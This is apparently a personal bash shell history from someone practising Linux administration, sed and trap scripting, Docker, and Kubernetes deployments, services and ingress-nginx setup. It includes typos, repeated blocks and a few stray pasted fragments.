ps aux |grep httpd
ps --help
man ps
ls -al /proc |grep "^d"
ls /bin /usr/bin |sort |uniq |grep zip
man grep
rpm -qa |grep kernel
find /etc -type f -exec grep '[0-9][0-9]*[.][0-9][0-9]*[.]
[0-9][0-9]*[.]
[0-9][0-9]*[.]



find /etc -type f -exec grep '[0-9][0-9]*[.][0-9][0-9]*[.]
[0-9][0-9]*[.]
[0-9][0-9]*' {} \;
find /etc -type f -exec grep '[0-9][0-9]*[.][0-9][0-9]*[.][0-9][0-9]*[.][0-9][0-9]*' {} \;
tar -cf - /home/PTY |(cd /backup/;tar xf -)
tar cf - /home/PTY |(cd /backup/;tar xf -)
ls /home
tar cPf - /home/PTY |(cd /backup/;tar xf -)
cd /tmp
ls
ls /root
ls
ls / |head -5
cat -n /etc/bash.bashrc |sed '3,10d'
cat -n /etc/bashrc |sed '3,10d'
q
cat -n /etc/bashrc |sed -n '3,10p'
cat -n /etc/bashrc |sed  '3,10p'
cat -n /etc/bashrc |sed -n '3,10p'
sed --help
cat -n /etc/bashrc |sed -n '3,10'
cat -n /etc/bashrc |sed -n '3,10p'
echo $!
cd
ls -al |sort -r -n -k5
ps -auxw |sort
man ps
ps -auxw |sort
ls -al |split -l 5 - lsroot
ls -l lsroot*
ls -al
cat lsrootaa
cat lsrootab
ls
ls -alm
ll -m
ll -h
ll -H
ll -d
ll -t
ll -n
ll -m
ll -h
ll -T
ls --help
ll -s
ll Python-3.6.7
ll Python-3.6.7 -h
tar czf - Python-3.6.7 |split -b 10m - backup.tar.gz.
echo $!
ls
mv backup* lsroot* img1/
ls img1
ls
strings /usr/bin/uptime |grep GLIBC
ll /usr/bin/uptime
cat /usr/bin/uptime
XshellXshellXshellXshellXshellXshellXshellXshellXshellXshellXshellXshellXshellXshellXshellXshellXshellXshellXshellXshellXshellXshellXshellXshellXshellXshellXshellXshellXshellXshellXshellXshellXshellXshellXshellXshellXshellXshellXshellXshellXshellXshellXshellXshellq
dd if=/dev/mem bs=1k skip=768 count=256 2>/dev/null |strings -n 32 |less
ls -al |tail -n 5
ls -al |tail -5
ll
sort /etc/passwd -t: -k3 -n |tail -n1
sort /etc/passwd -t: -k3 -n |tail -n 1
ls /etc/cron.daily|tee /tmp/ls.output
cat /tmp/ls.output 
ls /etc/cron.daily|tee /tmp/stage1.txt |grep ^0 |tee /tmp/stage2.txt
cat /tmp/stage1.txt 
cat /tmp/stage2.txt 
echo abc |tee -
echo abc |tee - -
echo "this is for testing" |tr [:space:] '\t'
echo "this is for testing" |tr [:space:] '\t'|xargs
echo "this is for testing" |tr [:space:] '\t'
echo "my uid is 20004" |tr -d [:digit:] 
echo "my uid is 20004" |tr -d 0-9 
echo "my uid is 20004" |tr [:lower:] [:upper:]
sed --help
ps -ef |wc -l
ps -ef
 w |wc -l
w
sleep 60 &
jobs
echo$!
echo $!
sleep 30&
jobs -l
disown %1
jobs -l
ps -ef |grep sleep
echo $$
echo $!
sleep 60 &
jobs -l 
diown -h %1
disown -h %1
jobs -l
ps -ef |grep sleep
jobs -l
ps -ef |grep sleep
ps -f
kill -l
ps -C sleep -o pid=,cmd,stat
sleep 30&
ps -C sleep -o pid=,cmd,stat
ps
ps -f
ps -ef |head -2
ps aux |grep httpd
pstree
pstree httpd
pstree http
pstree apache
pstree 2699
pstree 13762
pstree root
pgrep -u root sshd
ps 
pgrep -u root,daemon
jobs
ps -ef |grep sleep
kill sleep
kill -KILL sleep
kill -9 sleep

ps
ps -ef |grep sleep
kill -9 2717
ps -ef |grep sleep
ps
killall sleep
cd scripts01/
vim subshell.sh
sh subshell.sh 
echo $SHLVL
bash
echo$!
echo $SHLVL
mktemp -h
File=`mktemp -u /tmp/testtrap.$$.XXXXXX`
ls /tmp
vim testtrap1.sh
sh testtrap1.sh 
vim testtrap2.sh
sh testtrap2.sh 
sh testtrap2.sh &
kill -l
mv *.sh scripts01/
ls
cd scripts01/
ls
vim sigwinch_handler.sh
sh sigwinch_handler.sh 
vim trapbg_clearup.sh
ls -trl /tmp/ |tail -1
sh trapbg_clearup.sh
ls -trl /tmp/ |tail -1
ls /tmp
sh trapbg_clearup.sh
ls /tmp
sh trapbg_clearup.sh &
jobs
vim trap_report.sh
sh trap_report.sh 
vim trap_report.sh
echo $LINENO
sh trap_report.sh 
echo $LINENO
less /var/log/messages |tail -10
vim trapoff_on.sh
sh trapoff_on.sh 
vim trapoff_on.sh
sh trapoff_on.sh 
vim trap_reset.sh
sh trap_reset.sh 
ls /tmp
sh trap_reset.sh 
ls /tmp
sh trap_reset.sh &
jobs
ls /tmp
cat /tmp/testtrap.3386.DfjV 
cat /tmp/testtrap.3381.WxLO.dead 
cat /tmp/testtrap.3376
cat /tmp/testtrap.3376.Ue1Q.dead 
sh trap_reset.sh 
ls /tmp
cat /tmp/testtrap.3397
cat /tmp/testtrap.3397.zleW.dead 
sh trap_reset.sh 
ls /tmp
cat /tmp/testtrap.3405.jEeg.dead 
rm /tmp/testtrap.*
cat -n trapoff_on.sh 
kill -15 3034
kill -9 3034
count=1
expr $count+1
expr $count + 1
echo (expr $count + 1)
echo $(expr $count + 1)
ls /tmp
ls -trl /tmp |tail -1
kill -1 3188
kill -15 3386
systemctl reboot
top
free -m
vim /etc/fstab 
source /etc/fstab 
vim /etc/fstab 
free -m
cd scripts01/
cat sedInsert
cat >sedInsert
cat >example
sed -f sedInsert example 
cat example 
cat sedInsert 
sed '$a<End of line>' example 
sed -f sedInsert  example 
cat sedInsert 
vim sedInsert 
sed -f sedInsert  example 
cat >sedchange
cat >mail.txt
sed -f sedchange mail.txt 
cat sedchange 
cat mail.txt 
vim sedchange 
vim mail.txt 
sed -f sedchange  mail.txt 
vim test.sh
sed -i 1i\#\!/bin/bash test.sh
cat test.sh 
sed '/^$/d' mail.txt 
vim mail.txt 
sed '/^$/d' mail.txt 
cat mail.txt 
sed '2,5d' mail.txt 
cat mail.txt 
vim mail.txt 
kubectl get pods
docker ps -a
reboot
systemctl list-dependencies sysinit.target
systemctl disable vsftp
systemctl disable vsftpd
systemctl enable vsftpd
systemctl disable vsftpd
systemctl list-dependencies multi-user.target |grep rc-local
ll /etc/rc.d/rc.local
cd scripts01/
ls
sed -f sedchange  mail.txt 
cat >sedNext
sed -f sedNext mail.txt 
vim mail.txt 
sed -f sedNext mail.txt 
sed '/^$/d' mail.txt 
cat >file1
cat >p1sed
sed -f p1sed file1 
vim p1sed 
sed -f p1sed file1 
vim p1sed 
docker ps -a
kubectl get pods
systemctl status kubelet
swapoff -a
vim /etc/fstab 
reboot
cd manifests/
ls
vim pod-demo.yaml 
kubectl delete -f pod-demo.yaml
kubectl create -f pod-demo.yaml
vim pod-demo.yaml 
kubectl create -f pod-demo.yaml
kubectl describe pod-demo.yaml 
kubectl describe pod-demo
kubectl describe pods pod-demo
kubectl delete -f pod-demo.yaml 
vim pod-demo.yaml 
kubectl create -f pod-demo.yaml

kubectl describe pods pod-demo
vim pod-demo.yaml 
vim liveness-exec.yaml
 
kubectl get pods
kubectl get pods -w
kubectl describe pod liveness-exec-pod
kubectl get pods -w
docker image ls
kubectl get pods
kubectl describe pods liveness-httpGet-pod
kubectl describe pods liveness-httpget-pod
kubectl exec -it liveness-httpget-pod -- /bin/sh
kubectl describe pods nd terminated with exit code 137
kubectl describe pods liveness-httpget-pod
kubectl exec -it liveness-httpget-pod -- /bin/sh
kubectl delete -f liveness-exec.yaml 
vim liveness-exec.yaml 
kubectl exec -it readiness-httpget-pod -- /bin/sh
kubectl delete -f readiness-httpget.yaml 
kubectl create -f pod-demo.yaml
kubectl create -f readiness-httpget.yaml 
kubectl exec -it readiness-httpget-pod -- /bin/sh
kubectl get pod
tail -10 /var/spool/mail/root 
tail -100 /var/spool/mail/root 
vim /etc/modprobe.d/modprobe.conf
ls /etc/modprobe.d
ls /etc/modprobe.d/
ls /etc/modprobe.d/dccp-blacklist.conf 
vim  /etc/modprobe.d/dccp-blacklist.conf 
source  /etc/modprobe.d/dccp-blacklist.conf 
badblocks -s -v -o /root/badblocks.log /dev/sda
smartctl -a /dev/sda3
dmesg 
ls
dmesg
less /var/spool/mail/root 
date
cd manifests/ 
kubectl get pods
systemctl start kubelet
systemctl enable kubelet
kubectl get pods
kubectl explain pods.spec.containers.lifecycle
kubectl explain pods.spec.containers.lifecycle.postStart
vim poststart-pod.yaml
kubectl create -f poststart-pod.yaml 
kubectl get pods
kubectl delete -f poststart-pod.yaml 
vim poststart-pod.yaml 
kubectl create -f poststart-pod.yaml 
kubectl get pods
kubectl delete -f poststart-pod.yaml 
vim post
vim poststart-pod.yaml 
kubectl explain pods.spec.containers.lifecycle.postStart
vim poststart-pod.yaml 
kubectl explain pods.spec.containers.lifecycle.postStart
vim poststart-pod.yaml 
kubectl create -f poststart-pod.yaml 
kubectl get pods
kubectl exec -it poststart-pod -- /bin/sh
kubectl delete -f poststart-pod.yaml 
vim poststart-pod.yaml 
kubectl create -f poststart-pod.yaml 
kubectl exec -it poststart-pod -- /bin/sh
kubectl get pods
kubectl describe pods poststart-pod
kubectl delete -f poststart-pod.yaml 
history |tail -300
history |tail -800
history |head +1000 tail +800
ls
dmesg
less /var/spool/mail/root 
date
cd manifests/ 
kubectl get pods
systemctl start kubelet
systemctl enable kubelet
kubectl get pods
kubectl explain pods.spec.containers.lifecycle
kubectl explain pods.spec.containers.lifecycle.postStart
vim poststart-pod.yaml
kubectl create -f poststart-pod.yaml 
kubectl get pods
kubectl delete -f poststart-pod.yaml 
vim poststart-pod.yaml 
kubectl create -f poststart-pod.yaml 
kubectl get pods
kubectl delete -f poststart-pod.yaml 
vim post
vim poststart-pod.yaml 
kubectl explain pods.spec.containers.lifecycle.postStart
vim poststart-pod.yaml 
kubectl explain pods.spec.containers.lifecycle.postStart
vim poststart-pod.yaml 
kubectl create -f poststart-pod.yaml 
kubectl get pods
kubectl exec -it poststart-pod -- /bin/sh
kubectl delete -f poststart-pod.yaml 
vim poststart-pod.yaml 
kubectl create -f poststart-pod.yaml 
kubectl exec -it poststart-pod -- /bin/sh
kubectl get pods
kubectl describe pods poststart-pod
kubectl delete -f poststart-pod.yaml 
history |tail -300
history |tail -800
history |head +1000 tail +800
history |head +1000 
ls
dmesg
less /var/spool/mail/root 
date
cd manifests/ 
kubectl get pods
systemctl start kubelet
systemctl enable kubelet
kubectl get pods
kubectl explain pods.spec.containers.lifecycle
kubectl explain pods.spec.containers.lifecycle.postStart
vim poststart-pod.yaml
kubectl create -f poststart-pod.yaml 
kubectl get pods
kubectl delete -f poststart-pod.yaml 
vim poststart-pod.yaml 
kubectl create -f poststart-pod.yaml 
kubectl get pods
kubectl delete -f poststart-pod.yaml 
vim post
vim poststart-pod.yaml 
kubectl explain pods.spec.containers.lifecycle.postStart
vim poststart-pod.yaml 
kubectl explain pods.spec.containers.lifecycle.postStart
vim poststart-pod.yaml 
kubectl create -f poststart-pod.yaml 
kubectl get pods
kubectl exec -it poststart-pod -- /bin/sh
kubectl delete -f poststart-pod.yaml 
vim poststart-pod.yaml 
kubectl create -f poststart-pod.yaml 
kubectl exec -it poststart-pod -- /bin/sh
kubectl get pods
kubectl describe pods poststart-pod
kubectl delete -f poststart-pod.yaml 
history |tail -300
history |tail -800
history |head +1000 tail +800
history |head +1000 
history |head -n 1800 |tail -n +1000
kubectl explain rs
kubectl explain rs.spec
kubectl explain rs.spec.template
kubectl explain rs.spec.template.spec
vim rs-demo.yaml
kubectl get pos
kubectl get pods
kubectl get deploy
kubectl delete deploy myapp
kubectl delete deploy ngx-dep
vim rs-demo.yaml 
kubectl create -f rs-demo.yaml 
kubectl get rs
kubectl get pods
l
ls
vim pod-demo.yaml 
docker login
kubectl get pods
kubectl delete -f rs-demo.yaml 
kubectl create -f rs-demo.yaml 
kubectl get pods
vim rs-demo.yaml 
kubectl get pods
vim rs-demo.yaml 
kubectl delete -f rs-demo.yaml 
kubectl create -f rs-demo.yaml 
kubectl get pods
kubectl get pods -o wide
kubectl delete pods myapp-d2hb9 
kubectl get pods --show-labels
kubectl label pods pod-demo release=canary
kubectl get pods --show-labels
vim rs-demo.yaml 
kubectl get pods --show-labels
kubectl delete pods pod-demo.yaml 
kubectl delete pods pod-demo
kubectl edit rs myapp-8pzrn    
kubectl edit rs myapp
kubectl get pod
kubectl edit rs myapp
kubectl get pod -o wide
kubectl get rs  -o wide
kubectl scale --replicas=3 deployment myapp
kubectl scale --replicas=1 rs  myapp
kubectl get rs  -o wide
kubectl get pod -o wide
kubectl explain deploy
kubectl explain deploy.spec
kubectl explain deploy.spec.strategy
kubectl explain deploy.spec.strategy.rollingUpdate
vim deploy-demo.yaml
kubectl apply -f deploy-demo.yaml 
vim deploy-demo.yaml
kubectl apply -f deploy-demo.yaml 
kubectl get pods
kubectl get deploy
kubectl get rs
kubectl get pod
vim deploy-demo.yaml 
kubectl apply -f deploy-demo.yaml 
kubectl get pod
kubectl describe deploy myapp
kubectl get pods
kubectl get pods -w
kubectl get pods -w -l app=myapp
docker image ls
docker rmi tinny*
docker rmi tinnyhttpd
docker rmi tinnyhttpd:v0.1-4
docker rmi tinyhttpd:v0.1-4
docker rmi tinyhttpd
docker rmi tinyhttpd*
docker rmi tinyhttpd*:*
docker rmi tiny*
docker image rm tiny*
docker image rm tinyhttpd:v0.1-[/d+]
docker image rm tinyhttpd:v0.1-/d+
docker image rm tinyhttpd:v0.1-/d
docker image rm tinyhttpd:v0.1-[/d]
docker image rm tinyhttpd:v0.1-*
docker images
docker images |awk '/<none>/{print "docker rmi "$3}'|bash
docker images |awk '/<none>/'
docker images |awk 'tiny'
docker images |awk '/tinyhttpd/'
docker images |awk 'tinyhttpd'
docker images |awk '/tinyhttpd/'
docker images |awk '/tinyhttpd/{print "docker rmi "$3}'|bash
docker ps -a
docker ps -a |grep 'Exited' |awk '{print $3}' |xargs docker stop |xargs docker rm
docker ps -a |grep 'Exited' |awk '{print $1}' |xargs docker stop |xargs docker rm
docker ps -a 
cd
vim docker-rm.txt
docker images |awk '/<none>/{print "docker rmi "$3}'
docekr iamges
docker images
docker images |awk '/tinyhttpd/{print "docker rmi "$3}'
exit
echo $SHLVL
bash
docker images |awk '/tinyhttpd/{print "docker rmi "$3}'|bash
history
history|grep echo
echo $SHlvl
echo $SHLVL
bash
docker ps -a
docker commit t1 dockerptu/httpd:latest
docker images
docker push dockerptu/httpd
docker stop t1
docker run --name -it dockerptu/httpd:v0.3
docker run --name t1 -it dockerptu/httpd:v0.3
echo $SHLVL
echo $BASH_SUBSHELL
cd manifests/
kubectl get pods -l app=myapp -w
docker images
history |grep docker
locate DockerFile
locate dockerFile
locate dockerfile
cd
ls /etc/docker/
ls
cd Envs/
ls
cd ../git/
ls
cd 
ls
ls /
ls /backup/
ls /backup/www.vpsmark.com/
rm -rf /backup/
ls /data/
ls
ls /etc/docker/
docker build --help
locate Dockerfile
cd img1/Dockerfile 
cd img1
ls
ls -al
vim Dockerfile 
cd
mv img1 img1-docker
ls
dmesg
cd manifests/
ls
cd
ls
ls -al
chmod u+x docker-rm.txt 
ls
chmod u+x kubeadm-init.txt 
cat ing...Socket\ close. 
rm ing...Socket\ close. 
ls
cat nohup.out 
rm nohup.out 
cat pil
bash
cd manifests/
docker ;ps -a
docker image ls
dmesg
vim /etc/modprobe.d/dccp-blacklist.conf 
vim /etc/modprobe.d/modprobe.conf
vim /etc/modprobe.d/dccp-blacklist.conf 
kubectl get pods
kubectl delete myapp
kubectl delete  rs myapp
vim rs-demo.yaml 
vim deploy-demo.yaml 
kubectl get rs -o wide
docker image ls
vim deploy-demo.yaml 
kubectl apply -f deploy-demo.yaml 
vim deploy-demo.yaml 
kubectl explain svc.spec.ports
kubectl explain svc.spec.selector
kubectl delete pods --labels-name=myapp
kubectl delete pods myapp-deploy-759c578c6b-gtz95
kubectl scale --replicas=3 deployment myapp
dig -t A myapp
env
docker ps -a
ssh 10.134.99.64
ping 10.134.99.64
ip a
vim /etc/hosts
ls
cd scripts01/
ls
cat sedPrintln
cat >sedPrintln
cd /usr/src/kernels/
ls
ll
r passed.sh
cd
r passed.sh
docker ps -a
kubectl delete redis
kubectl delete svc myapp
kubectl delete svc redis
clear
kubectl get svc
kubectl explain svc
kubectl explain svc.spec
kubectl get pods
vim redis-svc.yaml
mv redis-svc.yaml ./manifests/
cd manifests/
ls
kubectl apply -f redis-svc.yaml 
vim
vim redis-svc.yaml 
kubectl apply -f redis-svc.yaml 
kubectl get svc
kubectl describe svc redis
kubectl get pods
kubectl get pods -o wide
kubectl delete pods myapp*
kubectl delete pods myapp
kubectl delete pods myapp-deploy-68f8ddbc68-knggq
kubectl delete pods yapp-deploy-68f8ddbc68-knggq
kubectl delete pods myapp-deploy-759c578c6b-v9zw5
kubectl delete pods myapp-deploy-68f8ddbc68-z2bm6
ls
kubectl get pods 
kubectl get pods --show-labels
cp redis-svc.yaml  myapp-svc.yaml
vim myapp-svc.yaml 
kubectl apply -f myapp-svc.yaml 
kubectl get svc
unset https_proxy
unset http_proxy
curl 172.17.0.2
docker ps      ps ps ps -a
cd manifests/
vim deploy-demo.yaml 
docker run --name b2 -it myweb:v0.3-6
vim /etc/systemd/system/docker.service.d/https-proxy.conf 
yum -y install git
for file in validating-webhook.yaml.tpl with-validating-webhook.yaml.tpl;do wget https://raw.githubusercontent.com/kubernetes/ingress-nginx/master/deploy/$file;done
env
vim /etc/wgetrc 
vim ~/.wgetrc 
for file in validating-webhook.yaml.tpl with-validating-webhook.yaml.tpl;do wget https://raw.githubusercontent.com/kubernetes/ingress-nginx/master/deploy/$file;done
vim ~/.wgetrc 
for file in validating-webhook.yaml.tpl with-validating-webhook.yaml.tpl;do wget https://raw.githubusercontent.com/kubernetes/ingress-nginx/master/deploy/$file;done
ls
mv validating-webhook.yaml.tpl ingress-nginx/
mv with-validating-webhook.yaml.tpl ingress-nginx/
cd ingress-nginx/
ls
kubectl apply -f validating-webhook.yaml.tpl 
mv validating-webhook.yaml.tpl validating-webhook.yaml
mv with-validating-webhook.yaml.tpl with-validating-webhook.yaml
kubectl apply -f validating-webhook.yaml 
kubectl apply -f with-validating-webhook.yaml 
kubectl apply -f ./
vim validating-webhook.yaml 
mv validating-webhook.yaml validating-webhook.yaml.tpl
mv with-validating-webhook.yaml with-validating-webhook.yaml.tpl
kubectl apply -f https://raw.githubusercontent.com/kubernetes/ingress-nginx/nginx-0.30.0/deploy/static/provider/baremetal/service-nodeport.yaml
wget https://raw.githubusercontent.com/kubernetes/ingress-nginx/nginx-0.30.0/deploy/static/provider/baremetal/service-nodeport.yaml
kubectl apply -f service-nodeport.yaml 
kubectl create namespace ingress-nginx
kubectl get ns
kubectl apply -f service-nodeport.yaml 
kubectl get pods --all-namespaces -l app.kubernetes.io/name=ingress-nginx --watch
vim service-nodeport.yaml 
wget https://raw.githubusercontent.com/kubernetes/ingress-nginx/master/deploy/static/mandatory.yaml
kubectl apply -f mandatory.yaml 
kubectl get ns
kubectl get pods --all-namespaces -l app.kubernetes.io/name=ingress-nginx --watch
kubectk explain ingress.spec
kubectl explain ingress.spec
ls
vim deploy-demo.yaml 
kubectl get pos
kubectl get pods
cd
ls
cd ingress-nginx/
ls
cd
cd manifests/
mkdir ingress
cd ingress/
mv ~/ingress-nginx/deploy-demo.yaml .
ls
vim deploy-demo.yaml 
kubectl get pods 
vim deploy-demo.yaml 
kubectl get events
docker pull ikubernetes/myapp:v2
docker images
docker  run --name b1 -it ikubernetes/myapp:v2
env
uset
uset https_proxy
unset https_proxy
env
unset http_proxy
env
docker ps -a
docker ps -a |grep 'Exited' |awk '{print $1}' |xargs docker stop |xargs docker rm
docker ps -a
kubectl get componentstatus
ls
vim ipvs.moudles 
clear
kubectl explian ingress.spec.rules.http
kubectl explain ingress.spec.rules.http
kubectl explain ingress.spec.backend
kubectl create --help
kubectl create namespace dev
kubectl get ns
kubectl delete ns dev
mkdir ingress-nginx
cd ingress-nginx/
ls
for file in validating-webhook.yaml.tpl with-validating-webhook.yaml.tpl;do wget https://raw.githubusercontent.com/kubernetes/ingress-nginx/master/deploy/$file;done
cd
cd manifests/
ls
cp deploy-demo.yaml  ../ingress-nginx/
cd ../ingress-nginx/
ls
vim deploy-demo.yaml 
kubectl scale --replicas=3 deployment myapp
kubectl get pods
kubectl scale --replicas=3 deployment myapp-deploy
kubectl get pods
kubectl get deploy
kubectl delete pods myapp-deploy-759c578c6b-srh9l  
kubectl scale --replicas=1 deployment myapp-deploy
kubectl get deploy 
kubectl get pods
kubectl scale --replicas=3 deployment myapp-deploy
kubectl get pods
cd
cd manifests/
vim deploy-demo.yaml 
kubectl apply -f deploy-demo.yaml 
kubectl get pods
kubectl get deploy
vim deploy-demo.yaml 
kubectl apply -f deploy-demo.yaml 
kubectl get pods
vim deploy-demo.yaml 
kubectl apply -f deploy-demo.yaml 
kubectl get pods
ls
kubectl get svc
vim myapp-svc.yaml 
kubectl get pods
kubectl scale --replicas=5 deployment myapp-deploy
kubectl get pods
kubectl scale --replicas=2 deployment myapp-deploy
kubectl get events
kubectl logs myapp-deploy
kubectl logs
kubectl get po
kubectl get rs
kubectl delete deploy myapp-deploy
kubectl get pods
docker ps -a
kubectl get po
vim deploy-demo.yaml 
kubectl apply -f deploy-demo.yaml 
kubectl get po
kubectl get events
docker images
docker run --name b1 myapp:latest
docker ps -a |grep myapp
docker exec -it   b1 /bin/bash
docker run --name b1 -it myapp
docker start -it b1
docker start  b1
docker exec -it   b1 /bin/bash
docker kill b1
docker stop b1
docker ps -a |grep myapp
docker kill b1
docker stop b1
docker kill b1
docker rm b1
docker ps -a |grep myapp
docker login
docker image rm myapp
docker images
vim deploy-demo.yaml 
docker run --name b1 -it dockerptu/myapp
curl 172.17.0.2
docker ps -a |grep b1
docker container rm b1
vim deploy-demo.yaml 
kubectl apply -f deploy-demo.yaml 
kubectl get po
docker pull ikubernetes/myapp:v2
env
docker ps -a |grep my
docker start -it b1
docker start  b1
docker ps -a |grep my
docker exec -it b1 /bin/bash
docker ps -a |grep my
docker exec -it b1
docker exec -it b1 /bin/sh
docker ps -a |grep my
cd manifests/ingress/
ls
vim deploy-demo.yaml 
kubectl apply -f  deploy-demo.yaml 
vim deploy-demo.yaml 
kubectl apply -f  deploy-demo.yaml 
kubectl get svc
vim deploy-demo.yaml 
kubectl apply -f  deploy-demo.yaml 
kubectl get po -n ingress-nginx
kubectl explain ingress.spec
history
docker image ls
cd
cd ingress-nginx/
wget ,10.244.1.68:80,10.244.1.69:80
Session Affinity:  None
wget https://raw.githubusercontent.com/uswitch/ingress/master/deploy/default-backend.yaml
kubectl apply -f default-backend.yaml 
kubectl get po -n ingress-nginx
kubectl explain Deploy
kubectl explain deploy
kubectl get po
kubectl get svc
kubectl get ing
vim default-backend.yaml 
kubectl apply -f default-backend.yaml 
kubectl get svc
kubectl get dep
kubectl get deploy
kubectl get po
kubectl get svc -n default-http-backend
ls
kubectl apply -f default-backend.yaml 
kubectl create svc b1
histrory|grep create
history |grep create
kubectl create service -h
kubectl create service b1
kubectl get svc
kubectl get ns
kubectl get svc -n ingress-nginx
ls
vim service-nodeport.yaml 
kubectl apply -f service-nodeport.yaml 
ls
rm validating-webhook.yaml.tpl 
rm with-validating-webhook.yaml.tpl 
ls
kubectl apply -f .
kubectl get svc -n ingress-nginx
cd 
cd manifests/ingress
ls
vim deploy-demo.yaml 
ls
cd
ls
cd ingress-nginx/
ls
cd mandatory.yaml 
cd
cd manifests/
ls
mv ingress-myapp.yaml ./ingress
cd ingress/
ls
vim ingress-myapp.yaml 
kubectl apply -f ingress-myapp.yaml 
kubectl describe ingress ingress-myapp
clear
kubectl get po -n ingress-nginx
kubectl get pods -n ingress-nginx
docker images
docker pull gcr.io/google_containers/defaultbackend:1.4
docker images
vim ingress-myapp.yaml 
ls
kubectl apply -f ingress-myapp.yaml 
kubectl explain ingress.spec
kubectl get po
kubectl get po -o wide
curl 10.134.196.21:80
vi /etc/httpd/conf/httpd.conf
systemctl restart httpd
systemctl status httpd -l
vim /etc/hosts
curl 127.0.0.1
vi /etc/httpd/conf/httpd.conf
systemctl restart httpd
curl 127.0.0.1
curl 127.0.0.1:80
curl 127.0.0.1:80/hostname.html
vi /etc/httpd/conf/httpd.conf
curl 10.134.196.21
vi /etc/httpd/conf/httpd.conf
systemctl restart httpd
vi /etc/httpd/conf/httpd.conf
systemctl restart httpd
curl 127.0.0.1:8080
vi /etc/httpd/conf/httpd.conf
systemctl restart httpd
systemctl status httpd -l
vim deploy-demo.yaml 
vim /etc/httpd/conf/httpd.conf
systemctl restart httpd
vim /etc/httpd/conf/httpd.conf
systemctl restart httpd
vim /etc/httpd/conf/httpd.conf
systemctl restart httpd
vim /etc/httpd/conf/httpd.conf
systemctl restart httpd
vim /etc/httpd/conf/httpd.conf
systemctl restart httpd
vim /etc/httpd/conf/httpd.conf
systemctl restart httpd
vim /etc/httpd/conf/httpd.conf
systemctl restart httpd
:q
yum -y install httpd
vim /etc/httpd/conf/httpd.conf
systemctl restart httpd
vim /etc/httpd/conf/httpd.conf
systemctl restart httpd
vim /etc/httpd/conf/httpd.conf
systemctl restart httpd
docker stop b1
docker rm b1
docker ps -a |grep my
docker rm b2
kubectl explain service.spec.ports
cd manifests/ingress/
vim deploy-demo.yaml 
kubectl apply -f deploy-demo.yaml 
kubectl get svc
kubectl get pods
kubectl get po -n ingress-ngin
kubectl get po -n ingress-nginx
kubectl apply -f https://raw.githubusercontent.com/kubernetes/ingress-nginx/nginx-0.30.0/deploy/static/mandatory.yaml
kubectl get po -n ingress-nginx
cd
kubectl get po
kubectl get svc
kubectl get sv
ks
ls
history
cd ingress-nginx/
vi service-nodeport.yaml 
kubectl apply -f service-nodeport.yaml 
kubectl get svc -n ingress-nginx
ip a
cd ../
cd manifests/
vim ingress-myapp.yaml
kubectl apply -f ingress
kubectl apply -f ingress-myapp.yaml 
kubectl get ingress
kubectl get in
kubectl get ig
kubectl get ing
kubectl describe ing ingress-myapp
kubectl describe ingress ingress-myapp
kubectl describe ingress ingreess-myapp
vim ingress-myapp.yaml 
kubectl apply -f ingress-myapp.yaml 
kubectl get ing
kubectl delete ing ingreess-myapp
kubectl get ing
kubectl describe ing ingress-myapp
kubectl get po -n ingress-nginx
kubectl exec -n ingress-it nginx-ingress-controller-7f74f657bd-zbwbd  -- /bin/sh
kubectl exec -n ingress -it nginx-ingress-controller-7f74f657bd-zbwbd  -- /bin/sh
kubectl exec -n ingress-nginx -it nginx-ingress-controller-7f74f657bd-zbwbd  -- /bin/sh
clear
cd ../ingress-nginx/
ls
kubectl apply -f mandatory.yaml 
vim service-nodeport.yaml 
kubectl explian ing
kubectl explian ingress
kubectl explain ingress
kubectl explain ingress.spec.rules
kubectl explain ingress.spec.rules.http.paths
vim /etc/hosts
kubectl describe svc myapp
vim default-backend.yaml 
kubectl apply -f default-backend.yaml 
vim default-backend.yaml 
rm default-backend.yaml 
vim default-backend.yaml
wget https://raw.githubusercontent.com/jcmoraisjr/ingress/master/deploy/default-backend.yaml
vim default-backend.yaml 
ls
history
vim default-backend.yaml 
clear
vim default-backend.yaml 
kubectl apply -f default-backend.yaml 
vim default-backend.yaml 
kubectl apply -f default-backend.yaml 
vim default-backend.yaml 
rm default-backend.yaml 
vim default-backend.yaml 
rm default-backend.yaml 
vim default-backend.yaml 
ls
wget https://raw.githubusercontent.com/uswitch/ingress/master/deploy/default-backend.yaml
vim default-backend.yaml 
vim service-nodeport.yaml 
clear
vim default-backend.yaml 
kubectl apply -f default-backend.yaml 
kubectl apply -f .
kubectl get po -n ingress-nginx
kubectl get svc -n ingress-nginx
vim default-backend.yaml 
kubectl get po -n ingress-nginx
kubectl get events
kubectl get events -n ingress-nginx
vim default-backend.yaml 
kubectl apply -f default-backend.yaml 
kubectl get events -n ingress-nginx
kubectl get po -n ingress-nginx
kubectl exec -n ingress-nginx -it nginx-ingress-controller-7f74f657bd-zbwbd --  /bin/sh
kubectl apply -f .
ls
vim mandatory.yaml 
ls
kubectl exec -n ingress-nginx -it nginx-ingress-controller-7f74f657bd-zbwbd --  /bin/sh
kubectl get svc
kubectl explain ingress.spec.http
kubectl explain ingress.spec
kubectl explain ingress.spec.rules
kubectl explain ingress.spec.rules.http
kubectl explain ingress.spec.rules.http.paths
kubectl get po
kubectl get ing
kubectl describe svc myapp
vim /etc/hosts
env
vim /etc/hosts
kubectl get svc -n ingress-nginx
ls
vim service-nodeport.yaml 
kubectl get po -o wide
kubectl exec -it myapp-deploy-8777b5f8b-xqdwl  -- /bin/sh
vim /etc/httpd/conf
vim /etc/httpd/conf.d/php
vim /etc/httpd/conf.d/php.conf 
firewall-cmd --query-port=80/tcp
netstat -an |grep 80
vim /var/www/html/test1.php 
unset https_proxy
unset http_proxy
kubectl explain service.spec
kubectl explain service.spec.ports
kubectl get svc
kubectl delete myapp
kubectl delete svc myapp
kubectl explain ingress
kubectl explain ingress.spec
kubectl explain ingress.spec.rules
kubectl explain ingress.spec.rules.http
kubectl explain ingress.spec.rules.http.paths
kubectl explain ingress.spec.rules.http.paths.backend
kubectl describe svc myapp
cd manifests/
ls
cat /etc/hosts
ls
vim deploy-demo.yaml 
kubectl get po -n ingress-nignx
kubectl get po -n ingress-nginx
docker images
kubectl get po
kubectl get svc
kubectl get svc -n ingress-nginx
kubectl get po -n ingress-nginx
ls
cd ingress/
ls
vim ingress-myapp.yaml 
env
curl 10.96.90.112:30080
vim ingress-myapp.yaml 
curl 10.96.90.112:30080
curl 10.150.7.55:30080
curl 10.134.196.21:30080
curl 10.244.1.69 
vim hostname.html
mv hostname.html /var/www/html/
systemctl status httpd
systemctl restart httpd
ps -ef |grep httpd
netstat -an |grep httpd
netstat -an |grep http
netstat -an |grep apache
systemctl status httpd -l 
curl 10.134.196.21:80
curl http://localhost:80
